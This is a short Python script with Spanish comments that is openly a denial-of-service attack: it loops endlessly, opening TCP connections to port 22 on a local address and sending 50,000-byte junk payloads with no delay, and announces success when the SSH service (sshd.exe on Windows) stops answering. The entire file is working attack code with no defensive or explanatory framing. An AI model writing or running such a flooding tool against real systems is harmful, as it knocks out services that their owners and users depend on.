import socket
import time

LHOST = "192.168.1.18" 
PORT = 22
carga = 50000 # Tamaño de paquete grande para saturar rápido

print("[!] Iniciando ataque de saturación infinita... Ctrl+C para detener.")

while True:
    try:
        instancia = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        instancia.settimeout(1) # Timeout agresivo para ir rápido
        
        instancia.connect((LHOST, PORT))
        
        # Enviamos la basura
        basura = "A" * carga
        instancia.send(basura.encode())
        
        print(f"[*] Paquete de {carga} bytes enviado... el CPU debería estar sufriendo.")
        
        instancia.close()
        # No ponemos time.sleep para que sea lo más rápido posible
        
    except Exception as e:
        print(f"\n[!!!] ¡EL SERVICIO HA COLAPSADO! No se pudo conectar: {e}")
        print("[*] Revisa el Monitor de Recursos en Windows, sshd.exe debería haber muerto.")
        break
